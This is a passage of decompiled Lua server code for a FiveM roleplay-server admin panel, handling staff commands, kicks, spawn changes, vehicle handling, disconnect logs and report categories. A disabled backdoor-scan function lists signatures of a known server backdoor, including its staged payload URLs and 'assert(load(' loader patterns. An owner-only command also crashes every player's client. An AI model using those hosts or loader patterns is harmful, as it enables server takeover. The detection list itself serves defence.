    L4_2 = A0_2
    L5_2 = A2_2
    return L3_2(L4_2, L5_2)
  end
  L3_2 = L29_1
  L4_2 = A0_2
  L5_2 = "gestion_dev"
  return L3_2(L4_2, L5_2)
end
L63_1(L64_1, L65_1, L66_1)
L63_1 = RegisterNetEvent
L64_1 = "gunware:getData"
L63_1(L64_1)
L63_1 = AddEventHandler
L64_1 = "gunware:getData"
function L65_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L0_2 = source
  L1_2 = IsStaff
  L2_2 = L0_2
  L1_2 = L1_2(L2_2)
  if not L1_2 then
    return
  end
  L1_2 = {}
  L2_2 = custom_data
  L1_2.custom_data = L2_2
  L2_2 = Handling
  L1_2.Handling = L2_2
  L2_2 = reportServer
  L1_2.reportServer = L2_2
  L2_2 = json
  L2_2 = L2_2.encode
  L3_2 = L1_2
  L2_2 = L2_2(L3_2)
  L3_2 = string
  L3_2 = L3_2.len
  L4_2 = L2_2
  L3_2 = L3_2(L4_2)
  L4_2 = 1048576
  if L3_2 > L4_2 then
    L4_2 = TriggerLatentClientEvent
    L5_2 = "gunware:getData:response"
    L6_2 = L0_2
    L7_2 = 50000
    L8_2 = L1_2
    L4_2(L5_2, L6_2, L7_2, L8_2)
  else
    L4_2 = TriggerClientEvent
    L5_2 = "gunware:getData:response"
    L6_2 = L0_2
    L7_2 = L1_2
    L4_2(L5_2, L6_2, L7_2)
  end
end
L63_1(L64_1, L65_1)
L63_1 = L60_1
L64_1 = "gunware:restartServer"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = logAdminAction
  L2_2 = {}
  L2_2.action = "Restart Server"
  L3_2 = GetPlayerName
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  L2_2.playerName = L3_2
  L2_2.description = "Restarted the server"
  L2_2.webhook = "server_restart"
  L1_2(L2_2)
  L1_2 = os
  L1_2 = L1_2.exit
  L2_2 = -1
  L1_2(L2_2)
end
L66_1 = "server_restart"
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "gunware:kickAll"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L1_2 = 0
  L2_2 = pairs
  L3_2 = GetPlayers
  L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2 = L3_2()
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    if L7_2 ~= A0_2 then
      L8_2 = DropPlayer
      L9_2 = L7_2
      L10_2 = "Admin has kicked all players."
      L8_2(L9_2, L10_2)
      L1_2 = L1_2 + 1
    end
  end
  L2_2 = logAdminAction
  L3_2 = {}
  L3_2.action = "Kick All Players"
  L4_2 = GetPlayerName
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  L3_2.playerName = L4_2
  L4_2 = "Kicked "
  L5_2 = L1_2
  L6_2 = " players from the server"
  L4_2 = L4_2 .. L5_2 .. L6_2
  L3_2.description = L4_2
  L3_2.webhook = "kick_all"
  L2_2(L3_2)
  L2_2 = TriggerClientEvent
  L3_2 = "gunware:notif"
  L4_2 = A0_2
  L5_2 = "success"
  L6_2 = "Kicked %d players from the server."
  L7_2 = L6_2
  L6_2 = L6_2.format
  L8_2 = L1_2
  L6_2, L7_2, L8_2, L9_2, L10_2 = L6_2(L7_2, L8_2)
  L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
end
L66_1 = "server_kick_all"
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "changespawn:coords"
function L65_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L2_2 = A1_2.target
  L3_2 = A1_2.position
  if not L2_2 then
    L4_2 = TriggerClientEvent
    L5_2 = "gunware:notif"
    L6_2 = A0_2
    L7_2 = "error"
    L8_2 = "Target player identifier is missing."
    L4_2(L5_2, L6_2, L7_2, L8_2)
    return
  end
  L4_2 = L34_1
  if not L4_2 then
    L4_2 = TriggerClientEvent
    L5_2 = "gunware:notif"
    L6_2 = A0_2
    L7_2 = "error"
    L8_2 = "Database connection not available."
    L4_2(L5_2, L6_2, L7_2, L8_2)
    return
  end
  L4_2 = L34_1.Async
  L4_2 = L4_2.execute
  L5_2 = "UPDATE users set position = @position WHERE identifier = @identifier"
  L6_2 = {}
  L7_2 = json
  L7_2 = L7_2.encode
  L8_2 = L3_2
  L7_2 = L7_2(L8_2)
  L6_2["@position"] = L7_2
  L6_2["@identifier"] = L2_2
  function L7_2(A0_3)
    local L1_3, L2_3, L3_3, L4_3, L5_3, L6_3, L7_3
    if A0_3 > 0 then
      L1_3 = TriggerClientEvent
      L2_3 = "gunware:notif"
      L3_3 = A0_2
      L4_3 = "success"
      L5_3 = "New spawn point defined successfully."
      L1_3(L2_3, L3_3, L4_3, L5_3)
      L1_3 = logAdminAction
      L2_3 = {}
      L2_3.action = "Change Spawn"
      L3_3 = GetPlayerName
      L4_3 = A0_2
      L3_3 = L3_3(L4_3)
      L2_3.playerName = L3_3
      L3_3 = "Changed spawn for player identifier "
      L4_3 = L2_2
      L5_3 = " to "
      L6_3 = json
      L6_3 = L6_3.encode
      L7_3 = L3_2
      L6_3 = L6_3(L7_3)
      L3_3 = L3_3 .. L4_3 .. L5_3 .. L6_3
      L2_3.description = L3_3
      L2_3.webhook = "change_spawn"
      L1_3(L2_3)
    else
      L1_3 = TriggerClientEvent
      L2_3 = "gunware:notif"
      L3_3 = A0_2
      L4_3 = "error"
      L5_3 = "Failed to update spawn point. Player identifier might not exist or data unchanged."
      L1_3(L2_3, L3_3, L4_3, L5_3)
    end
  end
  L4_2(L5_2, L6_2, L7_2)
end
L66_1 = "player_set_spawn"
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "gunware:crashServer"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L1_2 = IsOwner
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if not L1_2 then
    L1_2 = DropPlayer
    L2_2 = A0_2
    L3_2 = "You are not allowed to use this resource"
    L1_2(L2_2, L3_2)
    return
  end
  L1_2 = logAdminAction
  L2_2 = {}
  L2_2.action = "Crash Server"
  L3_2 = GetPlayerName
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  L2_2.playerName = L3_2
  L2_2.description = "Initiated server crash for all players"
  L2_2.webhook = "server_crash"
  L1_2(L2_2)
  L1_2 = pairs
  L2_2 = GetPlayers
  L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2 = L2_2()
  L1_2, L2_2, L3_2, L4_2 = L1_2(L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2)
  for L5_2, L6_2 in L1_2, L2_2, L3_2, L4_2 do
    L7_2 = TriggerClientEvent
    L8_2 = "gunware:crashServer"
    L9_2 = L6_2
    L7_2(L8_2, L9_2)
  end
end
function L66_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = IsOwner
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if L1_2 then
    L1_2 = L29_1
    L2_2 = A0_2
    L3_2 = "server_crash_all"
    L1_2 = L1_2(L2_2, L3_2)
  end
  return L1_2
end
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "gunware:tpAllToMe"
function L65_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  L2_2 = TriggerClientEvent
  L3_2 = "gunware:tpAllToMe"
  L4_2 = -1
  L5_2 = A1_2
  L2_2(L3_2, L4_2, L5_2)
  L2_2 = logAdminAction
  L3_2 = {}
  L3_2.action = "TP All to Me"
  L4_2 = GetPlayerName
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  L3_2.playerName = L4_2
  L4_2 = "Teleported all players to "
  L5_2 = GetPlayerName
  L6_2 = A0_2
  L5_2 = L5_2(L6_2)
  L6_2 = "'s location"
  L4_2 = L4_2 .. L5_2 .. L6_2
  L3_2.description = L4_2
  L3_2.webhook = "tp_all"
  L2_2(L3_2)
end
L66_1 = "server_tp_all"
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "gunware:clearCache"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = logAdminAction
  L2_2 = {}
  L2_2.action = "Clear Server Cache"
  L3_2 = GetPlayerName
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  L2_2.playerName = L3_2
  L2_2.description = "Attempted to clear server cache (will restart server)"
  L2_2.webhook = "clear_cache"
  L1_2(L2_2)
  L1_2 = os
  L1_2 = L1_2.exit
  L2_2 = -1
  L1_2(L2_2)
end
L66_1 = "server_clear_cache"
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "gunware:scanBackdoor"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2, L24_2, L25_2, L26_2, L27_2, L28_2, L29_2
  L1_2 = {}
  L2_2 = {}
  L2_2.Enable = true
  L2_2.DiscordAnnounceDetection = true
  L2_2.ConsolePrint = true
  L2_2.StopServer = false
  L3_2 = {}
  L4_2 = "cipher-panel"
  L5_2 = "Enchanced_Tabs"
  L6_2 = "helperServer"
  L7_2 = "ketamin.cc"
  L8_2 = "cipher-panel.me"
  L9_2 = "ketamin.cc"
  L10_2 = "MpWxwQeLMRJaDFLKmxVIFNeVfzVKaTBiVRvjBoePYciqfpJzxjNPIXedbOtvIbpDxqdoJR"
  L11_2 = "assert(load("
  L12_2 = "assert(loadstring("
  L13_2 = "local s = assert(load(d))"
  L14_2 = "https://cipher-panel.me/_i/c.php"
  L15_2 = "https://cipher-panel.me/_i/s.php"
  L16_2 = "https://cipher-panel.me/secure_area/fivem/sv/typer/earrape2.html?c=536"
  L17_2 = "https://landing.rk.com/?ats=eyJhIjo5MjU2OCwiYyI6NDU0MDUwNjYsIm4iOjIwLCJzIjozNTgsImUiOjg5ODMsInAiOjExfQ=="
  L18_2 = "https://cipher-panel.me/secure_area/fivem/sv/typer/earrape2.html"
  L19_2 = "https://upfilesc.wwwnl1-ss11.a2hosted.com/cipher_vis12.html"
  L20_2 = "https://cipher-panel.me/secure_area/fivem/sv/typer/cipher_bug.html"
  L21_2 = "https://cipher-panel.me/secure_area/fivem/sv/typer/screen3_2.html"
  L22_2 = "https://cipher-panel.me/secure_area/fivem/sv/typer/sound.html"
  L23_2 = "https://cipher-panel.me/secure_area/fivem/sv/typer/y.html"
  L24_2 = "https://rp.lanexa.fr/sdfdsfsdf/index.html"
  L25_2 = "https://cipher-panel.me/_i/v2_/stage3b.php?asf=MmVMYm1hZ3JCSlpUemN2N1gxZUpwbFZydEVIR3BVaHN1YmxQN1J1OGNXUGlhVVFwTmVnam5Vbi9GTGlMZjljKw=="
  L26_2 = "https://cipher-panel.me/_i/v2_/stage4.php?asf=YTFqWktJL0ZZbjJWYkEzZHNKV3J4Rm80M0xEVGdGekMvZElDaEhleEhOL2ErUUNSZWNSRTVWMjNpdkdNY2J6aQ=="
  L27_2 = "https://cipher-panel.me/_i/v2_/stage1b.php?asf=eERxeE1iejl5WWk2NlRaamVraTgzRjZkdFF4cWI0RW9ENjZSMmtNbDc3dnN1dXhDcXhEYVgrZDZSY05yWC9jaQ=="
  L28_2 = "https://cipher-panel.me/_i/i?to=l6Tr2"
  L29_2 = "https://cipher-panel.me/_i"
  L3_2[1] = L4_2
  L3_2[2] = L5_2
  L3_2[3] = L6_2
  L3_2[4] = L7_2
  L3_2[5] = L8_2
  L3_2[6] = L9_2
  L3_2[7] = L10_2
  L3_2[8] = L11_2
  L3_2[9] = L12_2
  L3_2[10] = L13_2
  L3_2[11] = L14_2
  L3_2[12] = L15_2
  L3_2[13] = L16_2
  L3_2[14] = L17_2
  L3_2[15] = L18_2
  L3_2[16] = L19_2
  L3_2[17] = L20_2
  L3_2[18] = L21_2
  L3_2[19] = L22_2
  L3_2[20] = L23_2
  L3_2[21] = L24_2
  L3_2[22] = L25_2
  L3_2[23] = L26_2
  L3_2[24] = L27_2
  L3_2[25] = L28_2
  L3_2[26] = L29_2
  L2_2.BackdoorStrings = L3_2
  L3_2 = TriggerClientEvent
  L4_2 = "gunware:notif"
  L5_2 = A0_2
  L6_2 = "info"
  L7_2 = "Backdoor scan d\195\169sactiv\195\169 - utilisation SQL uniquement"
  L3_2(L4_2, L5_2, L6_2, L7_2)
  L3_2 = logAdminAction
  L4_2 = {}
  L4_2.action = "Backdoor Scan"
  L5_2 = GetPlayerName
  L6_2 = A0_2
  L5_2 = L5_2(L6_2)
  L4_2.playerName = L5_2
  L4_2.description = "Backdoor scan attempt - feature disabled (SQL only mode)"
  L4_2.color = 8421504
  L4_2.webhook = "backdoor_scan"
  L3_2(L4_2)
end
L66_1 = "server_scan_backdoor"
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "gunware:afkTest"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = TriggerClientEvent
  L2_2 = "gunware:afkTest"
  L3_2 = -1
  L1_2(L2_2, L3_2)
  L1_2 = logAdminAction
  L2_2 = {}
  L2_2.action = "AFK Test"
  L3_2 = GetPlayerName
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  L2_2.playerName = L3_2
  L2_2.description = "Initiated AFK test for all players"
  L2_2.webhook = "afk_test"
  L1_2(L2_2)
end
L66_1 = "server_afk_test"
L63_1(L64_1, L65_1, L66_1)
L63_1 = RegisterNetEvent
L64_1 = "gunware:kick:afk"
L63_1(L64_1)
L63_1 = AddEventHandler
L64_1 = "gunware:kick:afk"
function L65_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2
  L0_2 = source
  L1_2 = DropPlayer
  L2_2 = L0_2
  L3_2 = "You were kicked for being AFK."
  L1_2(L2_2, L3_2)
  L1_2 = logAdminAction
  L2_2 = {}
  L2_2.action = "AFK Kick"
  L3_2 = GetPlayerName
  L4_2 = L0_2
  L3_2 = L3_2(L4_2)
  L2_2.playerName = L3_2
  L2_2.description = "Kicked player for being AFK"
  L2_2.webhook = "afk_kick"
  L1_2(L2_2)
end
L63_1(L64_1, L65_1)
L63_1 = RegisterNetEvent
L64_1 = "gunware:openMenu"
L63_1(L64_1)
L63_1 = AddEventHandler
L64_1 = "gunware:openMenu"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2
  L1_2 = source
  L2_2 = IsStaff
  L3_2 = L1_2
  L2_2 = L2_2(L3_2)
  if L2_2 then
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:openMenu"
    L4_2 = L1_2
    L5_2 = A0_2
    L2_2(L3_2, L4_2, L5_2)
  else
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = L1_2
    L5_2 = "error"
    L6_2 = "You do not have permission to open this menu."
    L2_2(L3_2, L4_2, L5_2, L6_2)
  end
end
L63_1(L64_1, L65_1)
L63_1 = RegisterNetEvent
L64_1 = "gunware:staffMode"
L63_1(L64_1)
L63_1 = AddEventHandler
L64_1 = "gunware:staffMode"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = source
  L2_2 = GetPlayerName
  L3_2 = L1_2
  L2_2 = L2_2(L3_2)
  if not L2_2 then
    L2_2 = "Unknown"
  end
  if A0_2 then
    L3_2 = logAdminAction
    L4_2 = {}
    L4_2.action = "Staff Mode Activated"
    L4_2.playerName = L2_2
    L4_2.description = "Mode staff activ\195\169"
    L4_2.color = 65280
    L4_2.webhook = "staff_mode"
    L3_2(L4_2)
  else
    L3_2 = logAdminAction
    L4_2 = {}
    L4_2.action = "Staff Mode Deactivated"
    L4_2.playerName = L2_2
    L4_2.description = "Mode staff d\195\169sactiv\195\169"
    L4_2.color = 16711680
    L4_2.webhook = "staff_mode"
    L3_2(L4_2)
  end
end
L63_1(L64_1, L65_1)
L63_1 = L60_1
L64_1 = "gunware:saveHandling"
function L65_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2
  L3_2 = Handling
  L3_2[A2_2] = A1_2
  L3_2 = saveHandlingEntry
  L4_2 = A2_2
  L5_2 = A1_2
  L3_2(L4_2, L5_2)
  L3_2 = TriggerClientEvent
  L4_2 = "gunware:notif"
  L5_2 = A0_2
  L6_2 = "success"
  L7_2 = "Handling saved successfully."
  L3_2(L4_2, L5_2, L6_2, L7_2)
  L3_2 = logAdminAction
  L4_2 = {}
  L4_2.action = "Save Handling"
  L5_2 = GetPlayerName
  L6_2 = A0_2
  L5_2 = L5_2(L6_2)
  L4_2.playerName = L5_2
  L5_2 = "Saved handling for vehicle: "
  L6_2 = A2_2
  L5_2 = L5_2 .. L6_2
  L4_2.description = L5_2
  L4_2.webhook = "save_handling"
  L3_2(L4_2)
end
L66_1 = "gestion_dev"
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "gunware:dellHandling"
function L65_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  L2_2 = Handling
  L2_2 = L2_2[A1_2]
  if nil == L2_2 then
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = A0_2
    L5_2 = "error"
    L6_2 = "This vehicle does not have saved handling."
    L2_2(L3_2, L4_2, L5_2, L6_2)
    return
  end
  L2_2 = Handling
  L2_2[A1_2] = nil
  L2_2 = deleteHandlingEntry
  L3_2 = A1_2
  L2_2(L3_2)
  L2_2 = TriggerClientEvent
  L3_2 = "gunware:notif"
  L4_2 = A0_2
  L5_2 = "success"
  L6_2 = "Handling deleted successfully."
  L2_2(L3_2, L4_2, L5_2, L6_2)
  L2_2 = logAdminAction
  L3_2 = {}
  L3_2.action = "Delete Handling"
  L4_2 = GetPlayerName
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  L3_2.playerName = L4_2
  L4_2 = "Deleted handling for vehicle: "
  L5_2 = A1_2
  L4_2 = L4_2 .. L5_2
  L3_2.description = L4_2
  L3_2.webhook = "delete_handling"
  L2_2(L3_2)
end
L66_1 = "gestion_dev"
L63_1(L64_1, L65_1, L66_1)
L63_1 = AddEventHandler
L64_1 = "playerDropped"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2
  L1_2 = source
  L2_2 = GetPlayerName
  L3_2 = L1_2
  L2_2 = L2_2(L3_2)
  if not L2_2 then
    L2_2 = "Unknown Player"
  end
  L3_2 = serverSyncLog
  L4_2 = string
  L4_2 = L4_2.format
  L5_2 = "D\195\169connexion de %s (ID: %d) - Raison: %s"
  L6_2 = L2_2
  L7_2 = L1_2
  L8_2 = A0_2
  L4_2 = L4_2(L5_2, L6_2, L7_2, L8_2)
  L5_2 = "info"
  L3_2(L4_2, L5_2)
  L3_2 = initializingPlayers
  L3_2[L1_2] = nil
  L3_2 = getIdentifiant
  L4_2 = L1_2
  L3_2 = L3_2(L4_2)
  if L3_2 then
    L4_2 = L45_1
    L5_2 = L3_2
    L6_2 = L1_2
    L4_2(L5_2, L6_2)
  end
  L4_2 = L11_1
  L5_2 = L1_2
  L6_2 = "player_dropped"
  L4_2(L5_2, L6_2)
  L4_2 = L13_1
  L5_2 = L1_2
  L6_2 = "player_dropped"
  L4_2(L5_2, L6_2)
  L4_2 = nil
  L5_2 = PlayerServer
  L5_2 = L5_2[L1_2]
  if L5_2 then
    L5_2 = PlayerServer
    L5_2 = L5_2[L1_2]
    L6_2 = serverSyncLog
    L7_2 = string
    L7_2 = L7_2.format
    L8_2 = "Suppression des donn\195\169es de %s (R\195\180le: %s)"
    L9_2 = L2_2
    L10_2 = L5_2.role
    L7_2 = L7_2(L8_2, L9_2, L10_2)
    L8_2 = "info"
    L6_2(L7_2, L8_2)
    L6_2 = PlayerServer
    L6_2[L1_2] = nil
    L6_2 = L5_2.role
    if L6_2 then
      L6_2 = L5_2.role
      if "user" ~= L6_2 then
        L6_2 = InvalidateStaffCache
        L6_2()
      end
    end
  else
    L5_2 = serverSyncLog
    L6_2 = string
    L6_2 = L6_2.format
    L7_2 = "Aucune donn\195\169e \195\160 supprimer pour %s (ID: %d)"
    L8_2 = L2_2
    L9_2 = L1_2
    L6_2 = L6_2(L7_2, L8_2, L9_2)
    L7_2 = "warning"
    L5_2(L6_2, L7_2)
  end
  L5_2 = GetOnlineStaff
  L5_2 = L5_2()
  L4_2 = L5_2
  L5_2 = ipairs
  L6_2 = L4_2
  L5_2, L6_2, L7_2, L8_2 = L5_2(L6_2)
  for L9_2, L10_2 in L5_2, L6_2, L7_2, L8_2 do
    if L9_2 > 1 then
      L11_2 = Citizen
      L11_2 = L11_2.Wait
      L12_2 = math
      L12_2 = L12_2.min
      L13_2 = 20
      L14_2 = L9_2
      L12_2, L13_2, L14_2, L15_2, L16_2, L17_2 = L12_2(L13_2, L14_2)
      L11_2(L12_2, L13_2, L14_2, L15_2, L16_2, L17_2)
    end
    L11_2 = GetPlayerPing
    L12_2 = L10_2
    L11_2 = L11_2(L12_2)
    if L11_2 >= 0 then
      L12_2 = 500
      if L11_2 <= L12_2 then
        L12_2 = TriggerClientEvent
        L13_2 = "gunware:player:leave"
        L14_2 = L10_2
        L15_2 = L1_2
        L12_2(L13_2, L14_2, L15_2)
    end
    else
      L12_2 = debugPrint
      L13_2 = string
      L13_2 = L13_2.format
      L14_2 = "playerDropped: impossible d'envoyer \195\160 %s (ID: %d) - ping: %d"
      L15_2 = GetPlayerName
      L16_2 = L10_2
      L15_2 = L15_2(L16_2)
      if not L15_2 then
        L15_2 = "Unknown"
      end
      L16_2 = L10_2
      L17_2 = L11_2
      L13_2 = L13_2(L14_2, L15_2, L16_2, L17_2)
      L14_2 = "warning"
      L12_2(L13_2, L14_2)
    end
  end
  L5_2 = Citizen
  L5_2 = L5_2.Wait
  L6_2 = 50
  L5_2(L6_2)
  L5_2 = ipairs
  L6_2 = L4_2
  L5_2, L6_2, L7_2, L8_2 = L5_2(L6_2)
  for L9_2, L10_2 in L5_2, L6_2, L7_2, L8_2 do
    if L9_2 > 1 then
      L11_2 = Citizen
      L11_2 = L11_2.Wait
      L12_2 = math
      L12_2 = L12_2.min
      L13_2 = 20
      L14_2 = L9_2
      L12_2, L13_2, L14_2, L15_2, L16_2, L17_2 = L12_2(L13_2, L14_2)
      L11_2(L12_2, L13_2, L14_2, L15_2, L16_2, L17_2)
    end
    L11_2 = GetPlayerPing
    L12_2 = L10_2
    L11_2 = L11_2(L12_2)
    if L11_2 >= 0 then
      L12_2 = 500
      if L11_2 <= L12_2 then
        L12_2 = TriggerClientEvent
        L13_2 = "gunware:playerDrop"
        L14_2 = L10_2
        L15_2 = L2_2
        L16_2 = A0_2
        L12_2(L13_2, L14_2, L15_2, L16_2)
      end
    end
  end
  L5_2 = PlayerServer
  L5_2 = L5_2[L1_2]
  L6_2 = L5_2 or L6_2
  if L5_2 then
    L6_2 = L5_2.role
    if L6_2 then
      L6_2 = L5_2.role
      L6_2 = "user" ~= L6_2
    end
  end
  L7_2 = logAdminAction
  L8_2 = {}
  if L6_2 then
    L9_2 = "Staff Disconnect"
    if L9_2 then
      goto lbl_178
    end
  end
  L9_2 = "Player Disconnect"
  ::lbl_178::
  L8_2.action = L9_2
  L8_2.playerName = L2_2
  L8_2.source = L1_2
  L9_2 = string
  L9_2 = L9_2.format
  L10_2 = "D\195\169connexion - Raison: %s"
  L11_2 = A0_2
  L9_2 = L9_2(L10_2, L11_2)
  L8_2.description = L9_2
  if L6_2 then
    L9_2 = 16711680
    if L9_2 then
      goto lbl_193
    end
  end
  L9_2 = 16776960
  ::lbl_193::
  L8_2.color = L9_2
  if L6_2 then
    L9_2 = "staff_disconnect"
    if L9_2 then
      goto lbl_200
    end
  end
  L9_2 = "player_disconnect"
  ::lbl_200::
  L8_2.webhook = L9_2
  L8_2.reason = A0_2
  L7_2(L8_2)
  L7_2 = serverSyncLog
  L8_2 = string
  L8_2 = L8_2.format
  L9_2 = "D\195\169connexion de %s trait\195\169e avec succ\195\168s"
  L10_2 = L2_2
  L8_2 = L8_2(L9_2, L10_2)
  L9_2 = "success"
  L7_2(L8_2, L9_2)
end
L63_1(L64_1, L65_1)
L63_1 = {}
L64_1 = {}
L64_1.id = "cheat"
L64_1.name = "Triche/Cheat"
L64_1.color = "~r~"
L64_1.priority = 4
L64_1.level = "critical"
L65_1 = {}
L65_1.id = "harassment"
L65_1.name = "Harc\195\168lement"
L65_1.color = "~o~"
L65_1.priority = 3
L65_1.level = "high"
L66_1 = {}
L66_1.id = "behavior"
L66_1.name = "Comportement inappropri\195\169"
L66_1.color = "~p~"
L66_1.priority = 2
L66_1.level = "normal"
L67_1 = {}
L67_1.id = "bug"
L67_1.name = "Bug/Probl\195\168me technique"
L67_1.color = "~y~"
L67_1.priority = 2
L67_1.level = "normal"
L68_1 = {}
L68_1.id = "other"
L68_1.name = "Autre"
L68_1.color = "~s~"
L68_1.priority = 1
L68_1.level = "low"
L63_1[1] = L64_1
L63_1[2] = L65_1
L63_1[3] = L66_1
L63_1[4] = L67_1
L63_1[5] = L68_1
L64_1 = {}
L64_1[1] = "low"
L64_1[2] = "normal"
L64_1[3] = "high"
L64_1[4] = "critical"
L65_1 = {}
L65_1.low = 1
L65_1.normal = 2
L65_1.high = 3
L65_1.critical = 4
L66_1 = {}
L66_1.low = 900
L66_1.normal = 600
L66_1.high = 300
L66_1.critical = 120
L67_1 = {}
L67_1.view_reported_profile = "Ouverture de la fiche du joueur signal\195\169"
L67_1.view_reporter_profile = "Ouverture de la fiche du cr\195\169ateur"
L67_1.bring_reported = "Bring du joueur signal\195\169"
L67_1.message_reported = "Message envoy\195\169 au joueur signal\195\169"
L67_1.kick_reported = "Kick du joueur signal\195\169"
L68_1 = "warn_reported"
L69_1 = "Warn du joueur signal\195\169"
L67_1[L68_1] = L69_1
L68_1 = "freeze_reported"
L69_1 = "Freeze/Unfreeze du joueur signal\195\169"
L67_1[L68_1] = L69_1
L68_1 = "message_reporter"
L69_1 = "Message envoy\195\169 au cr\195\169ateur"
L67_1[L68_1] = L69_1
L68_1 = "bring_both"
L69_1 = "Bring des deux joueurs"
L67_1[L68_1] = L69_1
L68_1 = "message_both"
L69_1 = "Message envoy\195\169 aux deux joueurs"
L67_1[L68_1] = L69_1
L68_1 = "stream_reporter"
L69_1 = "Vue \195\169cran lanc\195\169e sur le cr\195\169ateur"
L67_1[L68_1] = L69_1
L68_1 = "stream_reported"
L69_1 = "Vue \195\169cran lanc\195\169e sur le joueur signal\195\169"
L67_1[L68_1] = L69_1
L68_1 = "view_report_screenshot"
L69_1 = "Consultation du screenshot du report"
L67_1[L68_1] = L69_1
L68_1 = "goto_reporter"
L69_1 = "T\195\169l\195\169portation vers le cr\195\169ateur"
L67_1[L68_1] = L69_1
L68_1 = "ack_reporter"
L69_1 = "Accus\195\169 r\195\169ception envoy\195\169 au cr\195\169ateur"
L67_1[L68_1] = L69_1
L68_1 = "copy_context_coords"
L69_1 = "Copie des coordonn\195\169es du contexte"
L67_1[L68_1] = L69_1
function L68_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  if A1_2 and A1_2 <= 0 then
    L3_2 = nil
    return L3_2
  end
  L3_2 = type
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  if "table" ~= L3_2 then
    return A0_2
  end
  if not A2_2 then
    L3_2 = {}
    A2_2 = L3_2
  end
  L3_2 = A2_2[A0_2]
  if L3_2 then
    L3_2 = nil
    return L3_2
  end
  A2_2[A0_2] = true
  L3_2 = {}
  L4_2 = pairs
  L5_2 = A0_2
  L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2)
  for L8_2, L9_2 in L4_2, L5_2, L6_2, L7_2 do
    L10_2 = type
    L11_2 = L9_2
    L10_2 = L10_2(L11_2)
    if "function" ~= L10_2 then
      L10_2 = type
      L11_2 = L9_2
      L10_2 = L10_2(L11_2)
      if "thread" ~= L10_2 then
        L10_2 = type
        L11_2 = L9_2
        L10_2 = L10_2(L11_2)
        if "userdata" ~= L10_2 then
          L10_2 = L68_1
          L11_2 = L9_2
          L12_2 = A1_2 or L12_2
          if not A1_2 then
            L12_2 = 4
          end
          L12_2 = L12_2 - 1
          L13_2 = A2_2
          L10_2 = L10_2(L11_2, L12_2, L13_2)
          L3_2[L8_2] = L10_2
        end
      end
    end
  end
  A2_2[A0_2] = nil
  return L3_2
end
function L69_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  if not A0_2 then
    L1_2 = nil
    return L1_2
  end
  L1_2 = tostring
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  L2_2 = L1_2
  L1_2 = L1_2.lower
  L1_2 = L1_2(L2_2)
  L2_2 = ipairs
  L3_2 = L63_1
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = tostring
    L9_2 = L7_2.id
    L8_2 = L8_2(L9_2)
    L9_2 = L8_2
    L8_2 = L8_2.lower
    L8_2 = L8_2(L9_2)
    if L8_2 == L1_2 then
      return L7_2
    end
